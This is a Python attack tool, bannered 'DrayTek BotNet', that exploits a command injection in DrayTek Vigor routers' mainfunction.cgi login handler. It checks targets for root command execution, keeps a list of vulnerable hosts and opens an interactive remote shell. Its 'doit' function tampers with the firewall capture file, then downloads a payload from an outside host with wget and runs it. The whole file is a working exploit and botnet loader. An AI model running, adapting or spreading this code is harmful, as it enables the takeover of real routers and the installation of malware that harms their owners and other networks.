from urllib import request, parse
from socket import timeout
import ssl
from multi import m_exec, m_check
ssl._create_default_https_context = ssl._create_unverified_context

def check_vuln(url):
    try:
        full_url = "{0}".format(url)
        req =  request.Request(full_url)
        resp = request.urlopen(req, timeout=5)
        data = resp.read().decode('utf-8')
        # ugly parse :p
        ver = data[data.find('isomorphicDir'):].split('\n')[0][-6-4:-6]

        full_url = "{0}/http_ip_block.html".format(url)
        req =  request.Request(full_url)
        resp = request.urlopen(req, timeout=5)
        data = resp.read().decode('utf-8')
        print("\nDraytek Vigor %s"%ver)
        print("Firmware Last Update : %s"%resp.headers['Last-Modified'])
        
        full_url = "{0}/cgi-bin/mainfunction.cgi".format(url)
        # what check ?
        ck = 0
        with open('./list.txt', 'r') as fd:
            for ls in fd.readlines():
                if url in ls.strip():
                    ck = 1
                    break
        if ck:
            w = str(input('wanna do it ? '))
            if w == '':
                return 2, ver

        if 'root' in do_cmd(full_url, 'id'):
            print("[seem's kinda VULN to me ?]")
            if not ck:
                fd=open('./list.txt', 'a')
                fd.write('\n'+url)
                fd.close()
            return 0, ver
        else:
            print("[seem's kinda GAY to me ?]")
            return 1, 0
    except Exception as e:
            print(str(e))
            return 1, 0


def doit(url, ver):
        lcmd = [
            'mv /data/firewall.pcap ../',
            'rm -rf ../firewall.pcap',
            'wget http://stan.sh:1337/%s -O /tmp/ztmp'%ver,
            'sh /tmp/ztmp'
        ]
        
        c = False
        for cmd in lcmd:
            payload = {
                'action': 'login',
                'keyPath': "'\n{0}\n#".format(cmd.replace(' ', '${IFS}')),  # $IFS for bypass regex +
                'loginUser': 'user',
                'loginPwd': 'pass',
            }
            try:
                data = parse.urlencode(payload).encode()    # urlencode
                req =  request.Request(full_url, data=data)
                resp = request.urlopen(req, timeout=5)
            except Exception as e:
                print(str(e))
            # pause ?
            if not c:
                print('\n[download this] : wget --no-check-certificate %s'%(url+'firewall.pcap'))
                c = str(input('[ENTER]'))
                c = True
def banner():
    print('''
    DrayTek BotNet
    _
    m for multiple host on list.txt/others
    c for checking the host on list.txt/others
    ''')

def do_cmd(full_url, cmd):
        payload = {
            'action': 'login',
            'keyPath': "'\n{0}\n#".format(cmd.replace(' ', '${IFS}')),  # $IFS for bypass regex +
            'loginUser': 'user',
            'loginPwd': 'pass',
        }
        try:
            data = parse.urlencode(payload).encode()    # urlencode
            req =  request.Request(full_url, data=data)
            resp = request.urlopen(req, timeout=10).read().decode('ISO-8859-1')
            return(resp)
        except Exception as e:
            return(str(e))

if __name__=='__main__':
    banner()
    while True:
        url = str(input('> '))
        if url == 'm':    
            cmd = str(input('[cmd]> '.format(url)))
            m_exec(cmd)
            continue
        elif url == 'c':
            m_check('', '')
            continue
        elif url == 'd':
            m_dump()
            continue

        ck, ver = check_vuln(url)
        if ck == 1:
            continue
        elif ck == 2:
            full_url = "{0}/cgi-bin/corefunction.cgi".format(url)
        else:
            full_url = "{0}/cgi-bin/mainfunction.cgi".format(url)
        m_cmd=[]
        while True:
            if 'core' not in full_url:
                cmd = str(input('[{0}]> '.format(url)))
            else:
                cmd = str(input('[b3kt0t]-[{0}]> '.format(url)))
            
            # check input
            if cmd == 'q': # quit
                break
            elif cmd == 'doit': # backdoor func
                doit(url, ver)
                break
            elif '\\' in cmd:    # multiple input
                m_cmd.append(cmd.replace('\\', ''))
                continue
            elif m_cmd!=[]:
                m_cmd.append(cmd)
                for cmd in m_cmd:
                    print(do_cmd(full_url, cmd))
                m_cmd=[]
            else:    
                print(do_cmd(full_url, cmd))